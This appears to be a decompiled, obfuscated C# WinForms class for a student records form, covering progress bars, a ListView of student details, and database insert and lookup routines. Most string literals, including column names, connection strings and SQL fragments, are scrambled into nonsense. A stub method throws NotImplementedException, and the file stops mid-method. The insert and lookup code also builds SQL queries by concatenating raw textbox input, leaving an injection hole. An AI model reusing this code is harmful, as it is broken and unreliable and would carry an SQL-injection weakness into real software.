using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Windows.Forms;
using System.Xml.Serialization;
using Ag80Sw;
using Kb0k6R;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using p2Y1Em;

namespace x2ZBs0;

public class Rx3a7Y
{
	[StructLayout(LayoutKind.Auto)]
	internal struct Mb5r9E
	{
		internal object object_0;

		internal object object_1;

		internal object object_2;

		internal object object_3;

		internal object object_4;

		internal object object_5;

		internal object object_6;

		internal object object_7;

		internal object object_8;

		internal object object_9;

		internal object object_10;

		internal object object_11;
	}

	private int i;

	private object ProgressBar1;

	private object studentwindow;

	private object COMMAND;

	private object adp;

	private DataTable dt;

	private object Button3;

	private object studentbirthday;

	private object studentname;

	private object yrcmb;

	private object MySqlDbType;

	private object Button1;

	private Dq6e2L.Ck16Bg.q1N7Ar q1N7Ar_0 = new Dq6e2L.Ck16Bg.q1N7Ar();

	public Rx3a7Y()
	{
		dt = new DataTable();
	}

	private void n6HTc9(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(ProgressBar1, (Type)null, "Value", new object[1] { Operators.AddObject(NewLateBinding.LateGet(ProgressBar1, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null);
		checked
		{
			i++;
			if (i > 20)
			{
				NewLateBinding.LateSet(q1N7Ar_0.object_1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				Ja29Zx();
				NewLateBinding.LateCall(q1N7Ar_0.object_0, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
	}

	private void Ja29Zx()
	{
		throw new NotImplementedException();
	}

	private void w4T1Nr(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(q1N7Ar_0.object_1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ProgressBar1, (Type)null, "Maximum", new object[1] { 20 }, (string[])null, (Type[])null);
		i = 1;
	}

	private void Gw5z2L(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(q1N7Ar_0.object_1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ProgressBar1, (Type)null, "Maximum", new object[1] { 50 }, (string[])null, (Type[])null);
		i = 1;
	}

	private void Lw3n9W(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(ProgressBar1, (Type)null, "Value", new object[1] { Operators.AddObject(NewLateBinding.LateGet(ProgressBar1, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null);
		checked
		{
			i++;
			if (i > 50)
			{
				NewLateBinding.LateSet(q1N7Ar_0.object_1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				Ja29Zx();
				NewLateBinding.LateCall(studentwindow, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
	}

	private void m8F4Qk(object sender, EventArgs e)
	{
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"IDsdsa",
			80,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"Nasdfwame",
			150,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"Phonesdweweg Nusdgmber",
			150,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"Cousdgsdgrse",
			80,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"Yecvngyiar",
			80,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"Birhjlithday",
			150,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[3]
		{
			"Aykige",
			100,
			(object)(HorizontalAlignment)0
		}, (string[])null, (Type[])null, (bool[])null, true);
		w9NXp5();
		NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_4, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(studentbirthday, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		q1N7Ar_0.object_2 = objectValue;
		NewLateBinding.LateSet(q1N7Ar_0.object_2, (Type)null, "ConnectionString", new object[1] { "sesword=rooghjt;databjhjase=fhjdlogin" }, (string[])null, (Type[])null);
		adp = RuntimeHelpers.GetObjectValue(new object());
		IXmlSerializable xmlSerializable = new DataTable();
		object obj = adp;
		object[] obj2 = new object[1] { (DataTable)xmlSerializable };
		object obj3 = obj2;
		bool[] obj4 = new bool[1] { true };
		object obj5 = obj4;
		NewLateBinding.LateCall(obj, (Type)null, "Fill", obj2, (string[])null, (Type[])null, obj4, true);
		if ((obj5 as bool[])[0])
		{
			xmlSerializable = (DataTable)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(((object[])obj3)[0]), typeof(DataTable));
		}
		NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object enumerator = default(object);
		try
		{
			enumerator = ((DataTable)xmlSerializable).Rows.GetEnumerator();
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj6 = (DataRow)(enumerator as IEnumerator).Current;
				NewLateBinding.LateCall(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { ((DataRow)obj6)[0].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { (obj6 as DataRow)[1].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { ((DataRow)obj6)[2].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { (obj6 as DataRow)[3].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { ((DataRow)obj6)[4].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { (obj6 as DataRow)[5].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { (obj6 as DataRow)[6].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		finally
		{
			if (((IEnumerator)enumerator) is IDisposable)
			{
				((enumerator as IEnumerator) as IDisposable).Dispose();
			}
		}
		NewLateBinding.LateSet(studentbirthday, (Type)null, "Format", new object[1] { (object)(DateTimePickerFormat)8 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(studentbirthday, (Type)null, "CustomFormat", new object[1] { "fgth" }, (string[])null, (Type[])null);
		NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void d9Q7Ee(object sender, EventArgs e)
	{
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0616: Unknown result type (might be due to invalid IL or missing references)
		//IL_061c: Expected O, but got Unknown
		//IL_065b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0661: Expected O, but got Unknown
		//IL_0729: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		q1N7Ar_0.object_2 = objectValue;
		NewLateBinding.LateSet(q1N7Ar_0.object_2, (Type)null, "ConnectionString", new object[1] { "svdfhjmk65gin" }, (string[])null, (Type[])null);
		ISerializable serializable = (ISerializable)new ListViewItem(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null)));
		ListViewSubItemCollection subItems = ((ListViewItem)serializable).get_SubItems();
		object obj;
		object[] obj2 = new object[1] { NewLateBinding.LateGet(obj = NewLateBinding.LateGet(studentname, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null) };
		object obj3 = obj2;
		bool[] obj4 = new bool[1] { true };
		Array array = obj4;
		NewLateBinding.LateCall((object)subItems, (Type)null, "Add", obj2, (string[])null, (Type[])null, obj4, true);
		if (((bool[])array)[0])
		{
			NewLateBinding.LateSetComplex(obj, (Type)null, "Trim", new object[1] { (obj3 as object[])[0] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall((object)((ListViewItem)serializable).get_SubItems(), (Type)null, "Add", (object[])(obj3 = new object[1] { NewLateBinding.LateGet(obj = NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null) }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }), true);
		if ((array as bool[])[0])
		{
			NewLateBinding.LateSetComplex(obj, (Type)null, "Trim", new object[1] { (obj3 as object[])[0] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall((object)((ListViewItem)serializable).get_SubItems(), (Type)null, "Add", (object[])(obj3 = new object[1] { NewLateBinding.LateGet(obj = NewLateBinding.LateGet(q1N7Ar_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null) }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }), true);
		if ((array as bool[])[0])
		{
			NewLateBinding.LateSetComplex(obj, (Type)null, "Trim", new object[1] { ((object[])obj3)[0] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall((object)((ListViewItem)((serializable is ListViewItem) ? serializable : null)).get_SubItems(), (Type)null, "Add", (object[])(obj3 = new object[1] { NewLateBinding.LateGet(obj = NewLateBinding.LateGet(yrcmb, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null) }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }), true);
		if ((array as bool[])[0])
		{
			NewLateBinding.LateSetComplex(obj, (Type)null, "Trim", new object[1] { (obj3 as object[])[0] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall((object)((ListViewItem)((serializable is ListViewItem) ? serializable : null)).get_SubItems(), (Type)null, "Add", (object[])(obj3 = new object[1] { NewLateBinding.LateGet(obj = NewLateBinding.LateGet(studentbirthday, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null) }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }), true);
		if (((bool[])array)[0])
		{
			NewLateBinding.LateSetComplex(obj, (Type)null, "Trim", new object[1] { (obj3 as object[])[0] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall((object)((ListViewItem)((serializable is ListViewItem) ? serializable : null)).get_SubItems(), (Type)null, "Add", (object[])(obj3 = new object[1] { NewLateBinding.LateGet(obj = NewLateBinding.LateGet(q1N7Ar_0.object_9, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null) }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }), true);
		if (((bool[])array)[0])
		{
			NewLateBinding.LateSetComplex(obj, (Type)null, "Trim", new object[1] { (obj3 as object[])[0] }, (string[])null, (Type[])null, true, true);
		}
		try
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"vcx jhdf8g7re", NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' orsfdwef"), NewLateBinding.LateGet(studentname, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"safeyt79"), NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			COMMAND = RuntimeHelpers.GetObjectValue(new object());
			object obj5 = NewLateBinding.LateGet(COMMAND, (Type)null, "Parameters", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] obj6 = new object[2] { "dfdtret", null };
			obj = MySqlDbType;
			obj6[1] = NewLateBinding.LateGet(obj, (Type)null, "Int64", new object[0], (string[])null, (Type[])null, (bool[])null);
			obj3 = obj6;
			bool[] obj7 = new bool[2] { false, true };
			array = obj7;
			object obj8 = NewLateBinding.LateGet(obj5, (Type)null, "Add", obj6, (string[])null, (Type[])null, obj7);
			if (((bool[])array)[1])
			{
				NewLateBinding.LateSetComplex(obj, (Type)null, "Int64", new object[1] { ((object[])obj3)[1] }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateSetComplex(obj8, (Type)null, "Value", new object[1] { NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(COMMAND, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "HasRows", new object[0], (string[])null, (Type[])null, (bool[])null)))
			{
				Interaction.MsgBox((object)"nmje65u", (MsgBoxStyle)48, (object)"Dhgd");
				NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return;
			}
			q6Y3Zx();
			object obj9 = NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] obj10 = new object[1] { (object)(ListViewItem)serializable };
			obj3 = obj10;
			bool[] obj11 = new bool[1] { true };
			array = obj11;
			NewLateBinding.LateCall(obj9, (Type)null, "Add", obj10, (string[])null, (Type[])null, obj11, true);
			if ((array as bool[])[0])
			{
				serializable = (ISerializable)(ListViewItem)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(((object[])obj3)[0]), typeof(ListViewItem));
			}
			q0BAd4();
			w9NXp5();
			NewLateBinding.LateSet(studentbirthday, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(yrcmb, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(studentbirthday, (Type)null, "ResetText", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			ISerializable serializable2 = ex;
			MessageBox.Show((serializable2 as Exception).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void q6Y3Zx()
	{
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ca: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		q1N7Ar_0.object_2 = objectValue;
		NewLateBinding.LateSet(q1N7Ar_0.object_2, (Type)null, "ConnectionString", new object[1] { " vcn65" }, (string[])null, (Type[])null);
		try
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ntyi56wef", NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(studentname, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(q1N7Ar_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(yrcmb, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(studentbirthday, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(q1N7Ar_0.object_9, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')"));
			COMMAND = RuntimeHelpers.GetObjectValue(new object());
			RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(COMMAND, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(studentname, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(q1N7Ar_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
			{
				Interaction.MsgBox((object)"cxvr", (MsgBoxStyle)48, (object)"sdd4");
			}
			else if (Operators.ConditionalCompareObjectLess(NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "TextLength", new object[0], (string[])null, (Type[])null, (bool[])null), (object)11, false))
			{
				Interaction.MsgBox((object)"Edfr", (MsgBoxStyle)48, (object)"Indfeber");
				NewLateBinding.LateCall(q1N7Ar_0.object_7, (Type)null, "Focus", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			else if (Conversions.ToBoolean(Operators.NotObject(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "StartsWith", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null))))
			{
				Interaction.MsgBox((object)"Phuo0", (MsgBoxStyle)48, (object)"Ihjl7y7");
				NewLateBinding.LateCall(q1N7Ar_0.object_7, (Type)null, "Focus", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			else
			{
				Interaction.MsgBox((object)"Rnt66d!", (MsgBoxStyle)64, (object)"Su46ywsaved");
				NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			_Exception val = (_Exception)(object)ex;
			MessageBox.Show((val as Exception).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			NewLateBinding.LateCall(q1N7Ar_0.object_2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void Yz62Pw(object sender, EventArgs e)
	{
		Do9s0C();
		q0BAd4();
		NewLateBinding.LateSet(q1N7Ar_0.object_4, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_5, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
	}

	public void Do9s0C()
	{
		NewLateBinding.LateSet(studentname, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_7, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(yrcmb, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(studentbirthday, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
	}

	public void w9NXp5()
	{
		NewLateBinding.LateSet(studentname, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_7, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(yrcmb, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(q1N7Ar_0.object_9, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
	}

	public void q0BAd4()
	{
		NewLateBinding.LateCall(q1N7Ar_0.object_6, (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(studentname, (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(q1N7Ar_0.object_7, (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(q1N7Ar_0.object_8, (Type)null, "ResetText", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(yrcmb, (Type)null, "ResetText", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(q1N7Ar_0.object_9, (Type)null, "Text", new object[1] { "0" }, (string[])null, (Type[])null);
	}

	private void a6Z0Lc(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(q1N7Ar_0.object_6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), false))
		{
			NewLateBinding.LateSet(studentname, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_7, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(q1N7Ar_0.object_8, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(q1N7Ar_0.object_3, (Type)null, "SelectedItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "SubItems", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
